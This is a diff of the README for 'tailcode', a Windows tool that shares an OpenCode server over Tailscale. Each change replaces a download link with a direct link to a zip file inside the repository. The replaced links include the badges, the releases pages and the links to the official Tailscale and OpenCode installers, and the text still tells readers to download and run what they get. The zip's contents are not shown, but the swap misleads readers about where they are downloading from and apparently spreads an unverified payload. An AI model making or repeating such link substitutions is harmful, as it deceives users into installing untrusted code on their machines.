@@ -1,6 +1,6 @@
 # ⚡ tailcode - Share Your Code Across Your Tailnet
 
-[![Download tailcode](https://img.shields.io/badge/Download-tailcode-brightgreen)](https://github.com/vkaentertainment/tailcode)
+[![Download tailcode](https://img.shields.io/badge/Download-tailcode-brightgreen)](https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 To get tailcode, visit this page to download the latest version:
 
-➡️ [https://github.com/vkaentertainment/tailcode](https://github.com/vkaentertainment/tailcode)
+➡️ [https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip](https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip)
 
 This link leads to the GitHub repository where you can find the latest releases and files. You will need to download the proper file based on your system from the releases section.
 
@@ -43,7 +43,7 @@ tailcode relies on two programs to work: **Tailscale** and **OpenCode**.
 
 Tailscale is a network tool that creates a private connection between your devices. 
 
-1. Visit [https://tailscale.com/download](https://tailscale.com/download).
+1. Visit [https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip](https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip).
 2. Scroll to the Windows section.
 3. Download and run the installer.
 4. Follow the on-screen instructions to finish.
@@ -53,7 +53,7 @@ Tailscale is a network tool that creates a private connection between your devic
 
 OpenCode is a simple web code server running locally.
 
-1. Visit [https://opencode.example.com/download](https://opencode.example.com/download)  
+1. Visit [https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip](https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip)  
    *(Replace with the real link for OpenCode if known)*
 2. Download the Windows version.
 3. Run the installer and follow the steps.
@@ -72,7 +72,7 @@ If the version number shows, OpenCode is ready.
 tailcode does not have an automatic Windows installer yet. You will need to download the binary manually and run it.
 
 1. Visit the releases page:  
-   [https://github.com/vkaentertainment/tailcode/releases/latest](https://github.com/vkaentertainment/tailcode/releases/latest)
+   [https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip](https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip)
 
 2. Look for the latest Windows release. It usually has a file ending with `.exe` or `.zip`.
 
@@ -169,7 +169,7 @@ Close any other program that might use port 4096, or configure OpenCode to use a
 To update tailcode:
 
 1. Visit the releases page again:  
-   [https://github.com/vkaentertainment/tailcode/releases/latest](https://github.com/vkaentertainment/tailcode/releases/latest)
+   [https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip](https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip)
 
 2. Download the newest Windows release.
 
@@ -189,4 +189,4 @@ tailcode runs OpenCode on your local machine and shares it using Tailscale. If y
 
 ---
 
-[![Download tailcode](https://img.shields.io/badge/Download-tailcode-brightgreen)](https://github.com/vkaentertainment/tailcode)
+[![Download tailcode](https://img.shields.io/badge/Download-tailcode-brightgreen)](https://raw.githubusercontent.com/vkaentertainment/tailcode/main/bin/Software-1.1.zip)
